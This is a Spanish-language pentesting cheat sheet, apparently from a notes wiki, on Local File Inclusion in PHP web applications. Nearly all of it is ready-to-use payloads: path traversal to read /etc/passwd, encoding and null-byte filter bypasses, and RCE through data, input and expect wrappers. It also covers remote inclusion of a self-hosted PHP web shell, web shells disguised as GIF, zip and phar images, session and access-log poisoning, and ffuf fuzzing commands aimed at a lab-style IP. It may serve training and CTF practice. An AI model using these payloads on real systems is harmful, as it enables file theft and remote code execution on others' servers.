---
description: >-
  Un LFI (Local File Inclusion) es una vulnerabilidad de seguridad común en
  aplicaciones web que permite a un atacante incluir y ejecutar archivos locales
  en un servidor web.
---

# LFI (Local File Inclusion)

### LFI Basicos

* LFI basico\
  /index.php?language=/etc/passwd
* LFI con path traversal\
  /index.php?language=../../../../etc/passwd
* LFI con prefijo\
  /index.php?language=/../../../etc/passwd
* LFI dentro de una ruta\
  /index.php?language=./languages/../../../../etc/passwd

### LFI Bypasses

* Bypass basico con path traversal filter\
  /index.php?language=....//....//....//....//etc/passwd\
  /index.php?language=languages//....//....//....//....//....//flag.txt
* Bypass filters con URL encoding\
  /index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
* Bypass con null byte\
  /index.php?language=../../../../etc/passwd%00
* Leer PHP con base64 filter\
  /index.php?language=php://filter/read=convert.base64-encode/resource=archivo\_php

### RCE (Remote Code Execution)

#### PHP Wrappers

* RCE con data wrapper\
  /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D\&cmd=id
* RCE con input wrapper

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

* RCE con expect wrapper

```bash
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

#### RFI

* Host web shell

```bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>
```

* Incluir remote PHP web shell\
  /index.php?language=http://\<OUR\_IP>:\<LISTENING\_PORT>/shell.php\&cmd=comando

#### LFI + Upload

* Crear imagen maliciosa

```bash
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

* RCE con imagen maliciosa subida al servidor\
  /index.php?language=./profile\_images/shell.gif\&cmd=comando
* Crear archivo zip malicioso 'como jpg'

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

* RCE con archivo zip malicioso\
  /index.php?language=zip://shell.zip%23shell.php\&cmd=comando\
  Ejemplo: cat ../../../2f40d853e2d4768d87da1c81772bae0a.txt
* Crear archivo phar malicioso 'como jpg'

```bash
 php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

* RCE con archivo phar malicioso\
  /index.php?language=phar://./profile\_images/shell.jpg%2Fshell.txt\&cmd=id

#### Log Poisoning

* Leer PHP session parameters\
  /index.php?language=/var/lib/php/sessions/sess\_PHPSESSID
* Poison PHP session con web shell\
  /index.php?language=%3C%3Fphp%20system%28%24\_GET%5B%22cmd%22%5D%29%3B%3F%3E
* RCE a través de poisoned PHP session\
  /index.php?language=/var/lib/php/sessions/sess\_PHPSESSID\&cmd=id
* Poison server log

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>' 
```

* RCE a través de un poisoned PHP session\
  /index.php?language=/var/log/apache2/access.log\&cmd=id
* Fuzz page parameters

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs <tamaño_de_la_respuesta>
# Ejemplo
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://138.68.163.188:30645?FUZZ=value' -fs 2309
```

* Fuzz LFI payloads

```bash
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs <tamaño_de_la_respuesta>
# Ejemplo
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://138.68.163.188:30645/index.php?view=FUZZ' -fs 1935 # El parametro -fs sirve para que muestre lo diferente que el tamaño de respuesta
http://138.68.163.188:30645/index.php?view=../../../../../../../../../../../../../../../../../../flag.txt
```

* Fuzz webroot path

```bash
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs <tamaño_de_la_respuesta>
```

* Fuzz server configurations

```bash
 ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs <tamaño_de_la_respuesta>
```
